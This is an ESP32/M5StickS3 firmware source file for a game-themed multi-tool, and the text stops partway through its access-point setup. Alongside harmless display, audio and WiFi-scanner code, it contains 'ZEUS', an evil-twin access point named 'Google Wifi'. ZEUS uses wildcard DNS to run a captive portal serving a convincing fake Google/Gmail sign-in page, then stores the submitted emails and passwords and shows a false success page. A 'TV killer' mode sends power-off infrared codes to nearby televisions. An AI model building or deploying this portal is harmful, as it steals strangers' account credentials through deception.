/*
 * =====================================================
 *  THE INDEX — PRESCRIPT DEVICE v3.2
 *  M5StickS3
 * =====================================================
 *  MODOS:
 *    HERMES  — Prescript Device
 *    HADES   — TV Killer IR (GPIO46 via RMT)
 *    ZEUS    — Fake WiFi AP + Captive Portal
 *    ARES    — Scanner de redes WiFi
 *    APOLLO  — Strobo Display
 *
 *  MENU:
 *    Botao A — navegar entre modos
 *    Botao B — confirmar / voltar
 *
 *  AUDIO:
 *    index_message_1.wav — INCOMING / CLEAR / ERROR
 *    index_message_2.wav — SCRAMBLE loop / REVEAL
 *
 *  BIBLIOTECAS:
 *    M5Unified
 * =====================================================
 */

#include <M5Unified.h>
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <SPIFFS.h>
#include "driver/rmt_tx.h"
#include "driver/rmt_encoder.h"

#define WIFI_SSID           "SEU_WIFI_AQUI"
#define WIFI_PASS           "SUA_SENHA_AQUI"
#define IR_PIN              46
#define IR_CARRIER_FREQ     38000
#define IR_DUTY_CYCLE       0.33f
#define PRESCRIPT_TIMEOUT_S 60
#define HOLD_CLEAR_MS       2000
#define WIFI_CHECK_MS       10000
#define ZEUS_AP_CHANNEL     6
#define DNS_PORT            53

#define COL_BG       0x0000
#define COL_CYAN     0x07FF
#define COL_CYAN_DIM 0x0299
#define COL_CYAN_MID 0x034B
#define COL_WHITE    0xFFFF
#define COL_RED      0xF800

// ── FORWARD DECLARATIONS ──────────────────────────────
enum HermesState { HS_IDLE, HS_INCOMING, HS_SCRAMBLE, HS_DISPLAY, HS_CLEAR, HS_ERROR };
void hermes_changeState(HermesState s);
void hermes_trigger(const char* text, const char* sender);
void hermes_random();
void zeus_stop();
void ares_scan();

// ── RMT IR ────────────────────────────────────────────
rmt_channel_handle_t ir_chan    = NULL;
rmt_encoder_handle_t ir_encoder = NULL;

void ir_setup(){
  rmt_tx_channel_config_t cfg = {};
  cfg.gpio_num            = (gpio_num_t)IR_PIN;
  cfg.clk_src             = RMT_CLK_SRC_DEFAULT;
  cfg.resolution_hz       = 1000000; // 1us por tick
  cfg.mem_block_symbols   = 64;
  cfg.trans_queue_depth   = 4;
  cfg.flags.invert_out    = false;
  cfg.flags.with_dma      = false;
  ESP_ERROR_CHECK(rmt_new_tx_channel(&cfg, &ir_chan));

  rmt_carrier_config_t carrier = {};
  carrier.frequency_hz          = IR_CARRIER_FREQ;
  carrier.duty_cycle            = IR_DUTY_CYCLE;
  carrier.flags.polarity_active_low = false;
  ESP_ERROR_CHECK(rmt_apply_carrier(ir_chan, &carrier));

  rmt_copy_encoder_config_t enc_cfg = {};
  ESP_ERROR_CHECK(rmt_new_copy_encoder(&enc_cfg, &ir_encoder));
  ESP_ERROR_CHECK(rmt_enable(ir_chan));
}

void ir_transmit(rmt_symbol_word_t* symbols, size_t count){
  rmt_transmit_config_t tx_cfg = {};
  tx_cfg.loop_count         = 0;
  tx_cfg.flags.eot_level    = 0;
  ESP_ERROR_CHECK(rmt_transmit(ir_chan, ir_encoder, symbols,
                               count * sizeof(rmt_symbol_word_t), &tx_cfg));
  rmt_tx_wait_all_done(ir_chan, 200);
}

// NEC Raw builder
uint32_t necRaw(uint16_t address, uint8_t command){
  uint16_t nec_addr;
  if(address <= 0x00FF){
    uint8_t a = address & 0xFF;
    nec_addr = ((uint16_t)(~a) << 8) | a;
  } else {
    nec_addr = address;
  }
  uint32_t raw = 0;
  raw |= (uint32_t)nec_addr;
  raw |= (uint32_t)command       << 16;
  raw |= (uint32_t)(~command)    << 24;
  return raw;
}

void encodeNEC(uint32_t raw, rmt_symbol_word_t* sym, size_t* count){
  size_t idx = 0;
  sym[idx].duration0=9000; sym[idx].level0=1;
  sym[idx].duration1=4500; sym[idx].level1=0; idx++;
  for(int i=0;i<32;i++){
    sym[idx].duration0=560;  sym[idx].level0=1;
    sym[idx].duration1=(raw&(1UL<<i))?1690:560; sym[idx].level1=0; idx++;
  }
  sym[idx].duration0=560; sym[idx].level0=1;
  sym[idx].duration1=0;   sym[idx].level1=0; idx++;
  *count = idx;
}

void ir_send_nec(uint16_t address, uint8_t command){
  rmt_symbol_word_t sym[68];
  size_t count = 0;
  encodeNEC(necRaw(address, command), sym, &count);
  ir_transmit(sym, count);
}

void ir_send_samsung(uint32_t code){
  rmt_symbol_word_t sym[34];
  int idx = 0;
  sym[idx].duration0=4500; sym[idx].level0=1;
  sym[idx].duration1=4500; sym[idx].level1=0; idx++;
  for(int i=31;i>=0;i--){
    sym[idx].duration0=560; sym[idx].level0=1;
    sym[idx].duration1=(code&(1<<i))?1690:560; sym[idx].level1=0; idx++;
  }
  sym[idx].duration0=560; sym[idx].level0=1;
  sym[idx].duration1=0;   sym[idx].level1=0; idx++;
  ir_transmit(sym, idx);
}

void ir_send_sony12(uint16_t code){
  rmt_symbol_word_t sym[14];
  int idx = 0;
  sym[idx].duration0=2400; sym[idx].level0=1;
  sym[idx].duration1=600;  sym[idx].level1=0; idx++;
  for(int i=11;i>=0;i--){
    sym[idx].duration0=(code&(1<<i))?1200:600; sym[idx].level0=1;
    sym[idx].duration1=600; sym[idx].level1=0; idx++;
  }
  ir_transmit(sym, idx);
}

// ── HADES COMANDOS ────────────────────────────────────
struct HadesCmd { uint8_t type; uint32_t addr; uint8_t cmd; };
// type 0=NEC addr+cmd, 1=Samsung 32bit, 2=Sony12
const HadesCmd HADES_CMDS[] = {
  // LG WebOS (NEC)
  {0, 0x0004, 0x08}, // LG Power
  {0, 0x0004, 0xC5}, // LG Power alt
  {0, 0x0020, 0xDF}, // LG WebOS Power
  // Samsung
  {1, 0,      0}, // placeholder — código abaixo
  // Sony
  {2, 0x0A90, 0},
  {2, 0x0290, 0},
  {2, 0x054A, 0},
  // NEC genérico
  {0, 0x00FF, 0x98},
  {0, 0x00FF, 0xE8},
};

// Códigos Samsung completos
const uint32_t SAMSUNG_CODES[] = {
  0xE0E040BF, 0xE0E019E6, 0xE0E09966, 0x07E9E01F, 0xE0E0F00F
};
const int SAMSUNG_COUNT = 5;
const int HADES_COUNT = sizeof(HADES_CMDS)/sizeof(HadesCmd) + SAMSUNG_COUNT - 1;

void hades_send_idx(int idx){
  M5.Speaker.stop();

  // Samsung vem primeiro (indices 0..SAMSUNG_COUNT-1)
  if(idx < SAMSUNG_COUNT){
    ir_send_samsung(SAMSUNG_CODES[idx]);
    return;
  }
  idx -= SAMSUNG_COUNT;

  // LG NEC
  const HadesCmd& c = HADES_CMDS[idx];
  switch(c.type){
    case 0: ir_send_nec(c.addr, c.cmd); break;
    case 2: ir_send_sony12(c.addr);     break;
  }
}

// ── MODOS ─────────────────────────────────────────────
enum Mode { M_MENU, M_HERMES, M_HADES, M_ZEUS, M_ARES, M_APOLLO };
Mode currentMode = M_MENU;
int  menuIdx     = 0;
const int MENU_COUNT = 5;
const char* MENU_NAMES[] = { "HERMES","HADES","ZEUS","ARES","APOLLO" };
const char* MENU_DESC[]  = { "PRESCRIPT DEVICE","TV KILLER IR","FAKE AP + PORTAL","WIFI SCANNER","STROBE DISPLAY" };

// ── HERMES STATE ──────────────────────────────────────
HermesState hermesState   = HS_IDLE;
unsigned long hermesStateMs = 0;

const char* PRESCRIPTS[] = {
  "To: Bearer. Deliver package to Room 9 St.Blk14. Before sunrise.",
  "Eliminate the Thumb. No time limits.",
  "Locate Yi Sang. Do not let him leave the Nest.",
  "Protect the weaver. Her thread must not be severed.",
  "The candle at Corner of Rust must remain lit till morning.",
  "To: Proselyte. Verify identity of stranger at Gate 7.",
  "Report to Proxy Esther before next bell.",
  "As Hermes wills: Fulfill. Or face the consequence.",
  "Silence the one who saw the contents of the third cabinet.",
  "Deliver the ink to the scrivener before the seal is broken.",
};
const int PRESCRIPT_COUNT = 10;
const char* SENDERS[] = { "HERMES","PROXY ESTHER","THE INDEX","ORACLE","THE FINGER","NURSEFATHER" };
const int SENDER_COUNT = 6;

char targetBuf[256]   = "";
char scrambleBuf[256] = "";
int  scrambleLen = 0, revealedLen = 0, scramCycles = 0;
unsigned long lastScrTick = 0;
int  currentTextSize  = 1;
char currentSender[32]= "THE INDEX";
int  timeoutLeft      = PRESCRIPT_TIMEOUT_S;
unsigned long lastTimeoutTick = 0, btnAHoldStart = 0;
bool btnAHolding = false;
bool audioIncomingPlayed = false, audioClearPlayed = false, audioErrorPlayed = false;
unsigned long lastScramAudio = 0;

char wifiIP[20] = "no signal";
bool wifiOK = false;
unsigned long lastWifiCheck = 0;
char pendingPrescript[200] = "";
bool hermesHasPending = false;

int batLevel = 100;
unsigned long lastBatCheck = 0;

// ── HADES STATE ───────────────────────────────────────
int  hadesIdx = 0;
bool hadesRunning = false;
unsigned long hadesLastSent = 0;

// ── ZEUS ──────────────────────────────────────────────
bool zeusRunning = false;
char zeusSSID[33] = "Google Wifi";
int  zeusCredCount = 0;
struct Credential { char user[64]; char pass[64]; };
Credential zeusCreds[20];

const char ZEUS_LOGIN_PAGE[] PROGMEM = R"html(
<!DOCTYPE html><html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Google</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#fff;font-family:Arial,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh}
.card{width:100%;max-width:400px;padding:48px 40px;border:1px solid #dadce0;border-radius:8px}
h1{font-size:24px;color:#202124;text-align:center;margin-bottom:8px;font-weight:400}
.sub{font-size:14px;color:#202124;text-align:center;margin-bottom:24px}
.field{margin-bottom:16px}
input{width:100%;padding:12px 16px;border:1px solid #dadce0;border-radius:4px;font-size:16px;outline:none;color:#202124}
input:focus{border-color:#1a73e8;border-width:2px}
.forgot{font-size:14px;color:#1a73e8;text-decoration:none;display:block;margin-bottom:24px}
.next{background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:10px 24px;font-size:14px;font-weight:500;cursor:pointer;float:right}
.create{color:#1a73e8;font-size:14px;text-decoration:none}
.footer{display:flex;justify-content:space-between;align-items:center;margin-top:8px}
.glogo{font-size:32px;font-weight:bold;text-align:center;margin-bottom:16px}
.g{color:#4285F4}.o1{color:#EA4335}.o2{color:#FBBC05}.l{color:#34A853}
</style></head><body>
<div class="card">
<div class="glogo"><span class="g">G</span><span class="o1">o</span><span class="o2">o</span><span class="g">g</span><span class="l">l</span><span class="o1">e</span></div>
<h1>Sign in</h1><div class="sub">to continue to Gmail</div>
<form method="POST" action="/login">
<div class="field"><input type="email" name="u" placeholder="Email or phone" required></div>
<div class="field"><input type="password" name="p" placeholder="Password" required></div>
<a href="#" class="forgot">Forgot email?</a>
<div class="footer">
<a href="#" class="create">Create account</a>
<button type="submit" class="next">Next</button>
</div></form></div></body></html>
)html";

const char ZEUS_SUCCESS_PAGE[] PROGMEM = R"html(
<!DOCTYPE html><html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Google</title>
<style>
body{background:#fff;font-family:Arial,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh}
.card{padding:48px 40px;border:1px solid #dadce0;border-radius:8px;text-align:center;max-width:400px;width:100%}
.glogo{font-size:32px;font-weight:bold;margin-bottom:24px}
.g{color:#4285F4}.o1{color:#EA4335}.o2{color:#FBBC05}.l{color:#34A853}
h2{color:#202124;font-weight:400;margin-bottom:8px}p{color:#5f6368;font-size:14px}
</style></head><body>
<div class="card">
<div class="glogo"><span class="g">G</span><span class="o1">o</span><span class="o2">o</span><span class="g">g</span><span class="l">l</span><span class="o1">e</span></div>
<h2>Welcome back!</h2><p>You are now signed in to your Google account.</p>
</div></body></html>
)html";

const char HERMES_PAGE[] PROGMEM = R"html(
<!DOCTYPE html><html lang="pt-BR">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>HERMES</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#000;color:#0cf;font-family:'Courier New',monospace;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;padding:20px}
.box{border:1px solid #0cf;padding:28px;max-width:480px;width:100%}
h1{font-size:13px;letter-spacing:4px;text-align:center;margin-bottom:3px}
.sub{font-size:9px;color:#036;text-align:center;letter-spacing:2px;margin-bottom:20px}
label{display:block;font-size:10px;color:#036;letter-spacing:1px;margin-bottom:5px}
textarea{width:100%;background:#000;border:1px solid #0cf;color:#0cf;font-family:'Courier New',monospace;font-size:13px;padding:10px;resize:vertical;min-height:60px;outline:none;margin-bottom:12px}
textarea::placeholder{color:#024}
.row{display:flex;gap:8px;margin-bottom:8px}
button{flex:1;background:#000;border:1px solid #0cf;color:#0cf;font-family:'Courier New',monospace;font-size:10px;padding:10px;cursor:pointer;letter-spacing:2px;transition:all .15s}
button:hover{background:#0cf;color:#000}
button.g{border-color:#0f0;color:#0f0}button.g:hover{background:#0f0;color:#000}
hr{border:none;border-top:1px solid #036;margin:16px 0}
.p{font-size:10px;color:#036;cursor:pointer;padding:4px 0;border-bottom:1px solid #012}
.p:hover{color:#0cf}
#st{margin-top:12px;font-size:11px;color:#036;text-align:center;min-height:16px}
#st.ok{color:#0cf}
</style></head><body>
<div class="box">
<h1>[ THE INDEX ]</h1><div class="sub">HERMES -- PRESCRIPT TERMINAL</div>
<form id="f">
<label>COMPOSE PRESCRIPT:</label>
<textarea id="t" placeholder="Eliminate the Thumb. No time limits." maxlength="180"></textarea>
<div class="row">
<button type="submit">&#9654; TRANSMIT</button>
<button type="button" class="g" onclick="cmd('/clear')">&#10003; CLEAR</button>
<button type="button" onclick="cmd('/error')">&#9888; ERROR</button>
</div></form>
<div id="st"></div><hr>
<div style="font-size:10px;color:#036;letter-spacing:1px;margin-bottom:5px">ARCHIVE:</div>
<div class="p" onclick="fill(this)">Eliminate the Thumb. No time limits.</div>
<div class="p" onclick="fill(this)">Locate Yi Sang. Do not let him leave the Nest.</div>
<div class="p" onclick="fill(this)">Protect the weaver. Her thread must not be severed.</div>
<div class="p" onclick="fill(this)">As Hermes wills: Fulfill. Or face the consequence.</div>
</div>
<script>
function fill(el){document.getElementById('t').value=el.textContent}
async function post(body){
  const s=document.getElementById('st');s.className='';s.textContent='TRANSMITTING...';
  try{const r=await fetch('/hermes',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body});
  s.className=r.ok?'ok':'';s.textContent=r.ok?'** TRANSMITTED **':'ERROR: '+r.status;}
  catch(e){s.textContent='CONNECTION ERROR';}
}
function cmd(c){post('p='+encodeURIComponent(c));}
document.getElementById('f').addEventListener('submit',e=>{
  e.preventDefault();const t=document.getElementById('t').value.trim();if(t)post('p='+encodeURIComponent(t));
});
</script></body></html>
)html";

// ── ARES ──────────────────────────────────────────────
struct WifiNet { char ssid[33]; int rssi; uint8_t enc; int channel; char bssid[18]; };
WifiNet aresNets[20];
int  aresCount = 0, aresScroll = 0;
bool aresScanning = false;

// ── APOLLO ────────────────────────────────────────────
bool apolloRunning = false;
int  apolloSpeed   = 100;
unsigned long apolloLastFlash = 0;
bool apolloFlash = false;

// ── OBJETOS ───────────────────────────────────────────
WebServer hermesServer(80);
WebServer zeusServer(80);
DNSServer dnsServer;
M5Canvas  canvas(&M5.Display);

uint8_t* wavBuf  = nullptr;
size_t   wavSize = 0;
bool     wavLoop = false, spiffsOK = false;
unsigned long lastBeep = 0;
int W, H;

// ── AUDIO ─────────────────────────────────────────────
void audio_stop(){
  M5.Speaker.stop();
  if(wavBuf){ free(wavBuf); wavBuf=nullptr; wavSize=0; }
  wavLoop = false;
}
void audio_play(const char* filename, bool loop=false){
  if(!spiffsOK) return;
  audio_stop();
  File f = SPIFFS.open(filename,"r");
  if(!f) return;
  wavSize = f.size();
  wavBuf  = (uint8_t*)malloc(wavSize);
  if(!wavBuf){ f.close(); return; }
  f.read(wavBuf,wavSize); f.close();
  wavLoop = loop;
  M5.Speaker.playRaw((const int16_t*)(wavBuf+44),(wavSize-44)/2,48000,false,1);
}
void audio_loop_tick(){
  if(wavLoop && wavBuf && !M5.Speaker.isPlaying())
    M5.Speaker.playRaw((const int16_t*)(wavBuf+44),(wavSize-44)/2,48000,false,1);
}
void bip_select() { M5.Speaker.tone(1200,40); }
void bip_confirm(){ M5.Speaker.tone(1047,60); delay(70); M5.Speaker.tone(1568,80); }
void bip_back()   { M5.Speaker.tone(600,80); }
void bip_idle()   { M5.Speaker.tone(1200,25); }
void bip_error()  { M5.Speaker.tone(440,200); }

// ── UTILS ─────────────────────────────────────────────
int calcTextSize(int len){ return (len*12<=W-8)?2:1; }
int charWidth(int sz){ return sz*6; }
int textStartX(int len,int sz){ return max((W-len*charWidth(sz))/2,4); }
int textCenterY(int sz){ int ch=sz*8; return 14+(H-14-4-ch)/2+ch-2; }

void draw_chrome(const char* badge,uint32_t bc,const char* footer,uint32_t fc){
  canvas.setTextSize(1);
  canvas.setTextColor(COL_CYAN_DIM);
  canvas.setCursor(2,4); canvas.print(currentSender);
  canvas.setTextColor(bc);
  canvas.setCursor(W-strlen(badge)*6-3,4); canvas.print(badge);
  canvas.drawLine(0,13,W,13,COL_CYAN_DIM);
  if(strlen(footer)>0){
    canvas.drawLine(0,H-14,W,H-14,COL_CYAN_DIM);
    canvas.setTextColor(fc);
    canvas.setCursor(2,H-9); canvas.print(footer);
  }
}

// ── MENU ──────────────────────────────────────────────
void draw_Menu(){
  canvas.fillScreen(COL_BG);
  canvas.setTextSize(1); canvas.setTextColor(COL_CYAN);
  canvas.setCursor(W/2-39,4); canvas.print("[ THE INDEX ]");
  canvas.drawLine(0,13,W,13,COL_CYAN_DIM);
  if(millis()-lastBatCheck>5000){ lastBatCheck=millis(); batLevel=M5.Power.getBatteryLevel(); }
  char batStr[12]; snprintf(batStr,sizeof(batStr),"BAT:%d%%",batLevel);
  canvas.setTextColor(batLevel>30?COL_CYAN_DIM:COL_RED);
  canvas.setCursor(W-strlen(batStr)*6-2,4); canvas.print(batStr);
  for(int i=0;i<MENU_COUNT;i++){
    int y=22+i*18; bool sel=(i==menuIdx);
    if(sel){ canvas.fillRect(0,y-2,W,16,COL_CYAN_DIM); canvas.setTextColor(COL_CYAN); }
    else canvas.setTextColor(COL_CYAN_DIM);
    canvas.setTextSize(1); canvas.setCursor(6,y);
    canvas.print(sel?"> ":"  "); canvas.print(MENU_NAMES[i]);
    canvas.setTextColor(sel?COL_CYAN_MID:0x0821);
    canvas.setCursor(50,y); canvas.print(MENU_DESC[i]);
  }
  canvas.drawLine(0,H-14,W,H-14,COL_CYAN_DIM);
  canvas.setTextColor(COL_CYAN_DIM);
  canvas.setCursor(2,H-9); canvas.print("[A]NAV  [B]SELECT");
}

// ── HERMES ────────────────────────────────────────────
const char* GL = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%&*?/|<>[]{}^~";
char rndG(){ return GL[random(strlen(GL))]; }

void scramble_init(const char* text,const char* sender){
  strncpy(currentSender,sender,31); currentSender[31]='\0';
  strncpy(targetBuf,text,255); targetBuf[255]='\0';
  scrambleLen=strlen(targetBuf);
  for(int i=0;i<scrambleLen;i++) scrambleBuf[i]=rndG();
  scrambleBuf[scrambleLen]='\0';
  revealedLen=0; scramCycles=0; lastScrTick=millis();
  lastScramAudio=0; currentTextSize=calcTextSize(scrambleLen);
}

bool scramble_tick(){
  if(millis()-lastScrTick<55) return false;
  lastScrTick=millis(); scramCycles++;
  if(scramCycles%3==0&&revealedLen<scrambleLen) scrambleBuf[revealedLen]=targetBuf[revealedLen++];
  for(int i=revealedLen;i<scrambleLen;i++) scrambleBuf[i]=rndG();
  return revealedLen>=scrambleLen;
}

void drawOneLine(const char* text,uint32_t col){
  int sz=currentTextSize;
  canvas.setTextSize(sz); canvas.setTextColor(col);
  canvas.setCursor(textStartX(strlen(text),sz),textCenterY(sz));
  canvas.print(text);
}

void drawScrambleOneLine(){
  int sz=currentTextSize,cw=charWidth(sz);
  int x0=textStartX(scrambleLen,sz),y=textCenterY(sz);
  canvas.setTextSize(sz);
  for(int i=0;i<scrambleLen;i++){
    canvas.setTextColor(i<revealedLen?COL_CYAN:COL_CYAN_MID);
    canvas.setCursor(x0+i*cw,y); canvas.print(scrambleBuf[i]);
  }
}

void hermes_changeState(HermesState s){
  hermesState=s; hermesStateMs=millis();
  if(s==HS_INCOMING) audioIncomingPlayed=false;
  if(s==HS_CLEAR)    audioClearPlayed=false;
  if(s==HS_ERROR)    audioErrorPlayed=false;
}

void hermes_trigger(const char* text,const char* sender){
  if(strcmp(text,"/clear")==0){ if(hermesState==HS_DISPLAY) hermes_changeState(HS_CLEAR); return; }
  if(strcmp(text,"/error")==0){ hermes_changeState(HS_ERROR); return; }
  scramble_init(text,sender); hermes_changeState(HS_INCOMING);
}

void hermes_random(){
  hermes_trigger(PRESCRIPTS[random(PRESCRIPT_COUNT)],SENDERS[random(SENDER_COUNT)]);
}

void hermes_connect(){
  WiFi.mode(WIFI_STA); WiFi.begin(WIFI_SSID,WIFI_PASS);
  unsigned long t=millis();
  while(WiFi.status()!=WL_CONNECTED&&millis()-t<8000) delay(200);
  if(WiFi.status()==WL_CONNECTED){ wifiOK=true; strncpy(wifiIP,WiFi.localIP().toString().c_str(),19); }
}

void hermes_setupServer(){
  hermesServer.on("/",[](){ hermesServer.send_P(200,"text/html",HERMES_PAGE); });
  hermesServer.on("/hermes",HTTP_POST,[](){
    if(!hermesServer.hasArg("p")){ hermesServer.send(400,"text/plain","EMPTY"); return; }
    String p=hermesServer.arg("p"); p.trim();
    if(!p.length()){ hermesServer.send(400,"text/plain","EMPTY"); return; }
    strncpy(pendingPrescript,p.c_str(),199); pendingPrescript[199]='\0';
    hermesHasPending=true; hermesServer.send(200,"text/plain","OK");
  });
  hermesServer.begin();
}

void draw_Hermes(){
  unsigned long t=millis()-hermesStateMs;
  if(hermesHasPending&&hermesState!=HS_INCOMING&&hermesState!=HS_SCRAMBLE){
    hermesHasPending=false; hermes_trigger(pendingPrescript,"HERMES");
  }
  if(wifiOK) hermesServer.handleClient();
  if(wifiOK&&millis()-lastWifiCheck>WIFI_CHECK_MS){
    lastWifiCheck=millis();
    if(WiFi.status()!=WL_CONNECTED){ wifiOK=false; strncpy(wifiIP,"lost",19); }
  }
  switch(hermesState){
    case HS_IDLE:{
      canvas.fillScreen(COL_BG);
      draw_chrome("IDLE",COL_CYAN_DIM,"[A]PRESCRIPT  [B]BACK",COL_CYAN_DIM);
      bool blink=(millis()/420)%2==0;
      canvas.setTextSize(2); canvas.setTextColor(blink?COL_CYAN:COL_CYAN_DIM);
      canvas.setCursor(W/2-54,H/2-7); canvas.print("* * * * * *");
      canvas.setTextSize(1); canvas.setTextColor(COL_CYAN_DIM);
      canvas.setCursor(2,H/2+14); canvas.print(wifiOK?wifiIP:"no signal");
      if(millis()-lastBeep>3000){ lastBeep=millis(); bip_idle(); }
      break;
    }
    case HS_INCOMING:{
      canvas.fillScreen(COL_BG);
      bool fl=(t/120)%2==0;
      if(fl){ canvas.drawRect(0,0,W,H,COL_CYAN); canvas.drawRect(1,1,W-2,H-2,COL_CYAN_DIM); }
      draw_chrome("INCOMING",COL_CYAN,"TRANSMITTING...",COL_CYAN_DIM);
      canvas.setTextSize(1); canvas.setTextColor(fl?COL_CYAN:COL_CYAN_MID);
      canvas.setCursor(W/2-42,H/2-4); canvas.print("** HERMES **");
      if(!audioIncomingPlayed){
        audioIncomingPlayed=true;
        if(spiffsOK) audio_play("/index_message_1.wav");
        else { M5.Speaker.tone(1047,60); delay(80); M5.Speaker.tone(1319,60); }
      }
      if(t>1100) hermes_changeState(HS_SCRAMBLE);
      break;
    }
    case HS_SCRAMBLE:{
      canvas.fillScreen(COL_BG);
      draw_chrome("DECODING",COL_CYAN_MID,"",COL_BG);
      drawScrambleOneLine();
      if(lastScramAudio==0){ lastScramAudio=millis(); if(spiffsOK) audio_play("/index_message_2.wav",true); }
      audio_loop_tick();
      if(scramble_tick()){
        audio_stop();
        if(spiffsOK) audio_play("/index_message_2.wav");
        else { M5.Speaker.tone(1760,90); delay(100); M5.Speaker.tone(2093,140); }
        timeoutLeft=PRESCRIPT_TIMEOUT_S; lastTimeoutTick=millis();
        hermes_changeState(HS_DISPLAY);
      }
      break;
    }
    case HS_DISPLAY:{
      canvas.fillScreen(COL_BG);
      canvas.setTextSize(1); canvas.setTextColor(COL_CYAN_DIM);
      canvas.setCursor(2,4); canvas.print(currentSender);
      canvas.drawLine(0,13,W,13,COL_CYAN_DIM);
      canvas.drawLine(0,H-14,W,H-14,COL_CYAN_DIM);
      bool blink=(t/700)%2==0;
      canvas.setTextColor(blink?COL_CYAN_DIM:COL_BG);
      canvas.setCursor(2,H-9); canvas.print("[HOLD A] CLEAR");
      if(btnAHolding){
        unsigned long held=millis()-btnAHoldStart;
        int bw=W-16,hf=min((int)((held*bw)/HOLD_CLEAR_MS),bw);
        canvas.drawRect(8,H-6,bw,3,COL_CYAN_DIM); canvas.fillRect(8,H-6,hf,3,COL_CYAN);
      }
      drawOneLine(targetBuf,COL_CYAN);
      if(millis()-lastTimeoutTick>=1000){
        lastTimeoutTick=millis(); timeoutLeft--;
        if(timeoutLeft<=0) hermes_changeState(HS_ERROR);
      }
      if(timeoutLeft<=30&&millis()-lastBeep>200){ lastBeep=millis(); M5.Speaker.tone(880,40); }
      audio_loop_tick();
      break;
    }
    case HS_CLEAR:{
      canvas.fillScreen(COL_BG);
      bool fl=(t/200)%2==0;
      canvas.drawRect(0,0,W,H,fl?COL_CYAN:COL_CYAN_DIM);
      canvas.drawRect(1,1,W-2,H-2,fl?COL_CYAN_DIM:COL_BG);
      canvas.setTextSize(2); canvas.setTextColor(fl?COL_CYAN:COL_CYAN_MID);
      const char* msg=".CLEAR/";
      canvas.setCursor(W/2-(strlen(msg)*12)/2,H/2-7); canvas.print(msg);
      if(!audioClearPlayed){
        audioClearPlayed=true;
        if(spiffsOK) audio_play("/index_message_1.wav");
        else { M5.Speaker.tone(1047,80); delay(90); M5.Speaker.tone(2093,150); }
      }
      audio_loop_tick();
      if(t>3000) hermes_changeState(HS_IDLE);
      break;
    }
    case HS_ERROR:{
      canvas.fillScreen(COL_BG);
      bool fl=(t/200)%2==0;
      canvas.drawRect(0,0,W,H,fl?COL_CYAN:COL_CYAN_DIM);
      canvas.drawRect(1,1,W-2,H-2,fl?COL_CYAN_DIM:COL_BG);
      canvas.setTextSize(2); canvas.setTextColor(fl?COL_CYAN:COL_CYAN_MID);
      const char* msg=".ERROR/";
      canvas.setCursor(W/2-(strlen(msg)*12)/2,H/2-7); canvas.print(msg);
      if(!audioErrorPlayed){
        audioErrorPlayed=true;
        if(spiffsOK) audio_play("/index_message_1.wav");
        else bip_error();
      }
      int iv=max(100,(int)(800-(int)(t/10)));
      if(millis()-lastBeep>(unsigned long)iv){ lastBeep=millis(); M5.Speaker.tone(440,40); }
      canvas.drawLine(0,H-14,W,H-14,COL_CYAN_DIM);
      canvas.setTextColor((t/600)%2==0?COL_CYAN_DIM:COL_BG);
      canvas.setTextSize(1); canvas.setCursor(2,H-9); canvas.print("[A] DISMISS");
      audio_loop_tick();
      break;
    }
  }
}

void hermes_btnA(){
  if(hermesState==HS_IDLE) hermes_random();
  else if(hermesState==HS_ERROR) hermes_changeState(HS_IDLE);
}
void hermes_btnA_hold(){ if(hermesState==HS_DISPLAY) hermes_changeState(HS_CLEAR); }
void hermes_btnB(){ audio_stop(); hermes_changeState(HS_IDLE); currentMode=M_MENU; bip_back(); }

// ── HADES ─────────────────────────────────────────────
void hades_start(){ hadesIdx=0; hadesRunning=true; hadesLastSent=0; bip_confirm(); }

void draw_Hades(){
  canvas.fillScreen(COL_BG);
  bool fl=(millis()/110)%2==0;
  canvas.drawRect(0,0,W,H,fl?COL_CYAN:COL_CYAN_DIM);
  canvas.drawRect(1,1,W-2,H-2,fl?COL_CYAN_DIM:COL_BG);
  canvas.setTextSize(1); canvas.setTextColor(fl?COL_CYAN:COL_CYAN_DIM);
  canvas.setCursor(2,4); canvas.print("** HADES **");
  canvas.drawLine(0,13,W,13,COL_CYAN_DIM);
  if(hadesRunning){
    char buf[32]; snprintf(buf,sizeof(buf),"SIGNAL %02d/%02d",hadesIdx,HADES_COUNT);
    canvas.setTextColor(COL_CYAN_DIM); canvas.setCursor(2,H/2-12); canvas.print(buf);
    int bw=W-16,fill=(hadesIdx*bw)/HADES_COUNT;
    canvas.drawRect(8,H/2,bw,5,COL_CYAN_DIM); canvas.fillRect(8,H/2,fill,5,COL_CYAN);
    canvas.setTextColor(fl?COL_CYAN:COL_CYAN_DIM);
    canvas.setCursor(2,H/2+14); canvas.print("KILLING TVs...");
    if(millis()-hadesLastSent>350){
      hadesLastSent=millis();
      if(hadesIdx<HADES_COUNT){
        hades_send_idx(hadesIdx);
        delay(30);
        hades_send_idx(hadesIdx);
        delay(30);
        hades_send_idx(hadesIdx);
        hadesIdx++;
      } else {
        hadesRunning=false;
      }
    }
  } else {
    canvas.setTextColor(COL_CYAN); canvas.setCursor(W/2-42,H/2-8); canvas.print("SEQUENCE COMPLETE");
    canvas.setTextColor(COL_CYAN_DIM); canvas.setCursor(W/2-36,H/2+4); canvas.print("[A] REPEAT");
  }
  canvas.drawLine(0,H-14,W,H-14,COL_CYAN_DIM);
  canvas.setTextColor(COL_CYAN_DIM); canvas.setCursor(2,H-9); canvas.print("[B] BACK");
}

void hades_btnA(){ hades_start(); }
void hades_btnB(){ hadesRunning=false; currentMode=M_MENU; bip_back(); }

// ── ZEUS ──────────────────────────────────────────────
void zeus_start(){
  zeusCredCount=0;
  WiFi.mode(WIFI_AP);
  WiFi.softAP(zeusSSID,"",ZEUS_AP_CHANNEL,0,4); delay(100);
  IPAddress apIP(192,168,4,1);
  WiFi.softAPConfig(apIP,apIP,IPAddress(255,255,255,0));
  dnsServer.start(DNS_PORT,"*",apIP);
